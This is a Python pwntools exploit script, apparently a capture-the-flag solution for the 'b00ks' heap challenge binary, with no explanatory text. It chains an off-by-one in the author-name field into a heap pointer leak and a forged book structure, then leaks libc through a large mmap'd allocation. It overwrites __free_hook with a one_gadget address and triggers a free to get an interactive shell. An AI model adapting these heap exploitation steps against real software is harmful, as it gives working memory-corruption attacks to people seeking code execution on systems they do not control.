from pwn import *
context.log_level='info'
context.arch='amd64'

p = process('b00ks')
elf = ELF('b00ks')
libc = elf.libc
#gdb.attach(p)#,"b *0x555555554E02\nb *0x555555554CA6\nc\n")

p.sendlineafter('name:','a'*28+'1'*4)

p.sendlineafter('>','1')
p.sendlineafter('name size:','208')
p.sendlineafter('chars):','b'*1)
p.sendlineafter('description size:','32')
p.sendlineafter('description:','c'*1)

p.sendlineafter('>','4')
p.recvuntil('1111')
bookarray  = u64(p.recv(6).ljust(8,'\0'))
log.success('bookarray : '+hex(bookarray))

p.sendlineafter('>','1')
p.sendlineafter('name size:','32')
p.sendlineafter('chars):','e'*31)
p.sendlineafter('description size:',str(0x30000))
p.sendlineafter('description:','f'*31)

p.sendlineafter('>','3')
p.sendlineafter(' edit:','1')
p.sendlineafter('description:',p64(1)+p64(bookarray+96+8)+p64(bookarray+96+8+8)+p64(0x20))

p.sendlineafter('>','5')
p.sendlineafter('name:','a'*28+'1'*4)
#p.sendlineafter('>','2')
#p.sendlineafter('delete:','1')
p.sendlineafter('>','4')
p.recvuntil('Name: ')
var1  = u64(p.recv(6).ljust(8,'\0'))
log.success('?var1? : '+hex(var1))
p.recvuntil('Description: ')
var2  = u64(p.recv(6).ljust(8,'\0'))
log.success('var2 : '+hex(var2))
libc.address = var2 - 0x59E010#599010
log.success('libc base addr  : '+hex(libc.address))
free_hook = libc.sym["__free_hook"]
log.success('libc free_hook addr  : '+hex(free_hook))
one_gadget = libc.address+0x4526a
log.success('libc one_gadget addr  : '+hex(one_gadget))
#raw_input('wait....')
p.sendlineafter('>','3')
p.sendlineafter(' edit:','1')
p.sendlineafter('description:',p64(free_hook))

p.sendlineafter('>','3')
p.sendlineafter(' edit:','2')
p.sendlineafter('description:',p64(one_gadget))

p.sendlineafter('>','2')
p.sendlineafter(' delete:','2')

p.interactive()
